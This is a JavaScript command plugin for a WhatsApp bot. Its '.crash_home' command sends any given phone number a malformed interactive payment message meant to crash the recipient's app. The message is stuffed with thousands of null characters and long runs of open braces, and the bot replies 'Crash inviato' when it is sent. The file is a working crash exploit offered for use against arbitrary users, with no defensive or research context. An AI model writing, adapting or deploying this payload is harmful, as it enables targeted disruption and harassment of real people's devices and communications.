let handler = async (m, { conn, args }) => {
  if (!args[0]) return m.reply('📩 Usa: .crash_home <numero>')

  let numi = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net'

  try {
    await conn.relayMessage(numi, {
      interactiveMessage: {
        body: {
          text: "bruxel4s"
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: JSON.stringify({
                reference_id: null,
                payment_method: "\u0000".repeat(0x1920),
                payment_timestamp: null,
              }),
            },
            {
              name: "single_select", buttonParamsJson: "{".repeat(1000),
            },
          ],
          messageParamsJson: "{".repeat(100),
        },
      },
    }, {
      additionalNodes: [
        {
          tag: "biz",
          attrs: {
            native_flow_name: "payment_method"
          }
        },
      ],
      participant: { jid: numi },
      userJid: numi,
    })

    m.reply(`✅ Crash inviato a ${numi}`)
  } catch (e) {
    console.error(e)
    m.reply(`⚠️ Errore: ${e.message}`)
  }
}

handler.command = /^crash_home$/i
export default handler